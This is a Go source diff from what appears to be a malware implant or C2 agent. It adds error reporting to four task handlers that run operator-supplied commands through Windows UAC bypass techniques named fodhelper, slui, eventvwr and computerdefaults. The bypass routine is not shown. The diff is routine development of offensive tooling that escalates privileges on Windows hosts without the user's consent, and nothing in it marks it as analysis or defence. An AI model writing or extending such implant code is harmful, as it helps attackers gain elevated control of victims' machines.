@@ -171,7 +171,10 @@ func handleFodhelper(task Task, res *TaskResult) {
 		res.Error = "Windows only"
 		return
 	}
-	_ = tryUACBypass("fodhelper", task.Command)
+	if err := tryUACBypass("fodhelper", task.Command); err != nil {
+		res.Error = "fodhelper failed: " + err.Error()
+		return
+	}
 	res.Output = "fodhelper triggered"
 }
 
@@ -180,7 +183,10 @@ func handleSluiUAC(task Task, res *TaskResult) {
 		res.Error = "Windows only"
 		return
 	}
-	_ = tryUACBypass("slui", task.Command)
+	if err := tryUACBypass("slui", task.Command); err != nil {
+		res.Error = "slui failed: " + err.Error()
+		return
+	}
 	res.Output = "slui triggered"
 }
 
@@ -189,7 +195,10 @@ func handleEventvwrUAC(task Task, res *TaskResult) {
 		res.Error = "Windows only"
 		return
 	}
-	_ = tryUACBypass("eventvwr", task.Command)
+	if err := tryUACBypass("eventvwr", task.Command); err != nil {
+		res.Error = "eventvwr failed: " + err.Error()
+		return
+	}
 	res.Output = "eventvwr triggered"
 }
 
@@ -198,7 +207,10 @@ func handleComputerDefaultsUAC(task Task, res *TaskResult) {
 		res.Error = "Windows only"
 		return
 	}
-	_ = tryUACBypass("computerdefaults", task.Command)
+	if err := tryUACBypass("computerdefaults", task.Command); err != nil {
+		res.Error = "computerdefaults failed: " + err.Error()
+		return
+	}
 	res.Output = "computerdefaults triggered"
 }
 
